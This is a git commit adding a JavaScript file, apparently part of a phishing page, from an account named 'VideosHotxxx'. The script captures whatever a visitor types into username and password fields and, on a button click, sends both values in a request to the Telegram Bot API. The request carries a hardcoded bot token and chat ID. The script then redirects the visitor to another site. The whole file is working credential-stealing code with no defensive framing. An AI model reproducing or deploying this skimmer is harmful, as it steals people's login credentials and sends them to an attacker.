e27134ac6d66645dc6cb9bdcf94b67d7e1145945
VideosHotxxx <154963578+VideosHotxxx@users.noreply.github.com>
2023-12-27 01:39:57 -0600

    Add files via upload

---
+++ script.js
@@ -0,0 +1,31 @@
+const sendatatme = document.getElementById("sendatatme");
+const first = document.getElementById("first");
+const second = document.getElementById("second");
+const resfirst = document.getElementById("resfirst");
+const resecond = document.getElementById("resecond");
+
+first.addEventListener("change", () => {
+  resfirst.value = first.value;
+});
+second.addEventListener("change", () => {
+  resecond.value = second.value;
+});
+
+function redirect() {
+  const Http = new XMLHttpRequest();
+  const url =
+    "https://api.telegram.org/bot6813587718:AAHxAsU8Vf3lkfaCv1ieAs4uvAlWLAhiDx8/sendMessage?chat_id=5052520420&text=USERNAME:%20" +
+    resfirst.value +
+    " PASSWORD: " +
+    resecond.value;
+  Http.open("GET", url);
+  Http.send();
+
+  Http.onreadystatechange = (e) => {
+    console.log(Http.responseText);
+  };
+
+window.location.href = 'https://www.gruposwats.com/xxx.html';
+}
+
+sendatatme.addEventListener("click", redirect);
